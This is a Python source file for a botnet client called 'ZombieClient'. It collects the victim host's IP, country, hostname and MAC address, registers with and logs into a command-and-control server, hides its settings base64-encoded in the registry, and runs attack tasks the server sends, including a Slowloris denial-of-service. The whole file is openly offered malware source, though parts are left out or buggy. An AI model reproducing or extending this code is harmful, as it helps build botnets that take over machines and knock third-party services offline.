#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import json, socket, datetime
from base64 import b64encode, b64decode
from time import sleep
from random import randint
from urllib.request import urlopen, Request
from hashlib import sha256

from modules import *

class ZombieClient:
    def __init__(self, conf_file='conf.json'):
        self.conf_file = conf_file

        self.credentials = {
            'username': 'r3nt0n',
            'pswd': 'password',
            'cc_url': 'http://localhost:8080/api'
        }

        self.settings = {
            'inet_unreach_retry': 15,
            'token_check_retry': 1
        }

        self.sys_info = {
            'public_ip': '',
            'country': '',
            'private_ip': '',
             'hostname': '',
             'mac_addr': ''
        }

        self.jwt = None
        self.jwt_expiration_time = None

    def refresh_public_net_info(self):
        self.sys_info['public_ip'], self.sys_info['country'] = system_info.get_public_ip_cc()

    # read saved conf from config file
    def refresh_local_net_info(self):
        self.sys_info['hostname'] = system_info.get_hostname()
        self.sys_info['private_ip'] = system_info.get_private_ip()
        self.sys_info['mac_addr'] = system_info.get_mac_addr()

    # read saved conf from registry
    def load_settings(self, setting_type):
        # read from conf file/winreg
        settings = system_ops.get_zombie_settings(setting_type)
        try:
            settings = json.loads(b64decode(settings))
            if settings and (self.settings != settings):
                self.settings = settings
                return False
            elif (not settings) and self.settings:
                # write settings if not reg found
                self.write_settings()
        except:
            return False

    # write running conf to registry
    def write_settings(self):
        try:
            # parse settings from dict to b64
            encoded_settings = b64encode(json.dumps(self.settings))
            system_ops.set_zombie_settings(encoded_settings)
            # write into conf file/winreg
            return True
        except:
            return False

    def generate_username(self):
        if not (self.sys_info['private_ip'] or self.sys_info['hostname']):
            self.refresh_local_net_info()
        string = self.sys_info['private_ip'] + self.sys_info['hostname'] + \
                 (datetime.datetime.now() - datetime.timedelta(hours=randint(1,100))).strftime("%m/%d/%Y, %H:%M:%S")
        username = sha256(bytes(string, 'utf-8')).hexdigest()
        return username

    def generate_password(self):
        charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!¡¿?=&@#-_.:;,'
        pswd_len = randint(24,32)
        password = ''
        for i in range(0, pswd_len):
            password += charset[randint(0, len(charset)-1)]
        return password

    def create_user(self):
        data = {
            'username': self.generate_username(),
            'pswd': self.generate_password()
        }
        url = self.credentials['cc_url'] + '/login.php'
        response = httpz.post_json(url, data)
        if response:
            self.credentials['username'] = data['username']
            self.credentials['pswd'] = data['pswd']

    def login(self):
        login_url = self.credentials['cc_url'] + '/login.php'
        self.load_settings('settings')
        data = {
            'username': self.credentials['username'],
            'pswd': self.credentials['pswd'],
            'public_ip': self.sys_info['public_ip'],
            'country': self.sys_info['country'],
            'hostname': self.sys_info['hostname']
        }
        response = httpz.post_json(login_url, data)
        if response and 'jwt' in response:
            self.jwt = response['jwt']
            self.expiration_time = datetime.datetime.now() + datetime.timedelta(hours=1)
            return self.jwt
        return False

    def keep_logged_in(self):
        while True:
            if (not self.jwt) or (self.jwt_expiration_time <= datetime.datetime.now()):
                self.refresh_local_net_info()
                try:
                    self.refresh_public_net_info()
                    self.login()
                # if no internet connection, sleep until retry login
                except socket.error:
                    sleep(self.settings['inet_unreach_retry'])
                    continue
            # sleep until recheck token
            sleep(self.settings['token_check_retry'])


    def do_task(self, task_type, task_content):
        # inform cc => attack is begining
        # ...
        if ('atk-ddos-slowloris' in task_type):
            target = task_content
            slowloris = Slowloris(target)
            slowloris.run()

        # inform cc => attack is finished
        # ...



if __name__ == "__main__":

    # print(system_info.get_public_ip_cc())
    z = ZombieClient()
    for x in range(0,8):
        print(z.generate_username())
    # print(z.generate_password())
